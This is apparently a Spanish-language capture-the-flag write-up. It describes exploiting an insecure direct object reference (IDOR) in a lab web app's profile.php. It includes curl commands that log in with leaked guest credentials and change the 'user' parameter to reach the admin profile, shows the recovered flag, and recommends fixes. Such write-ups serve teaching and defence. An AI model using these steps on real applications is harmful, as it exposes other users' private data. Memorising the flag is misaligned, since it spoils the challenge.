# Informe de Explotación de Vulnerabilidad: IDOR en Perfil de Usuario

## Resumen

Se identificó y explotó una vulnerabilidad de **Referencia Insegura y Directa a Objetos (IDOR)** en la aplicación web.
Esta vulnerabilidad permitió el acceso no autorizado al perfil del administrador, resultando en la extracción de la bandera del CTF.

---

## Objetivo

* **URL:** `http://10.67.158.124/`

---

## Vulnerabilidad

* **Tipo:** Insecure Direct Object Reference (IDOR)
* **Vector:** Parámetro `user` en `profile.php`
* **Descripción:**
  La aplicación no valida si el usuario autenticado tiene permiso para ver el perfil solicitado.
  Esto permite manipular el parámetro `user` en la URL para acceder a perfiles de otros usuarios, incluido el de **admin**.

---

## Proceso de Ataque

### 1. Reconocimiento Inicial

Al acceder a la página principal, se encontró un formulario de inicio de sesión.
Al inspeccionar el código fuente, se observó el siguiente comentario:

```html
<!-- use guest:guest credentials until registration is fixed. "admin" user account is off limits!!!!! -->
```

Esto reveló las credenciales `guest:guest`.

---

### 2. Obtención de Acceso

Se utilizó `curl` para iniciar sesión con la cuenta de invitado y guardar las cookies:

```bash
curl -L -c cookie.txt -X POST -d "username=guest&password=guest" http://10.67.158.124/index.php
```

La página de bienvenida contenía una pista clave:

> *"Try not to peep your neighbor's profile."*

---

### 3. Descubrimiento del Vector de Ataque

Al intentar acceder a `profile.php` sin parámetros, se devolvió un error:

```
Warning: Undefined array key "user" in /var/www/html/profile.php
```

Esto reveló que la ruta correcta era:

```
profile.php?user=<nombre_de_usuario>
```

Con esto se accedió al perfil propio (`guest`), confirmando la estructura del endpoint.

---

### 4. Explotación del IDOR

Aprovechando la ausencia de controles de autorización, se manipuló el parámetro `user` para acceder al perfil del administrador.

```bash
curl -L -b cookie.txt "http://10.67.158.124/profile.php?user=admin"
```

---

### 5. Resultado

El servidor devolvió la página del perfil del administrador sin verificar permisos.
La flag se encontraba directamente incrustada:

```html
<h1 class="my-5">Hi, <b>admin</b>. Welcome to your site. The flag is: flag{66be95c478473d91a5358f2440c7af1f}</h1>
```

---

## Causa Raíz y Remediación

### Causa

La aplicación confía ciegamente en el parámetro `user` sin comprobar si el usuario autenticado tiene permiso para ver ese recurso.

### Solución Recomendada

* Validar en backend que el ID del usuario solicitado coincida con el usuario de la sesión.
* Solo permitir acceder a perfiles de terceros si el usuario autenticado tiene permisos administrativos.
* Implementar controles de autorización siguiendo el principio de **mínimo privilegio**.

---
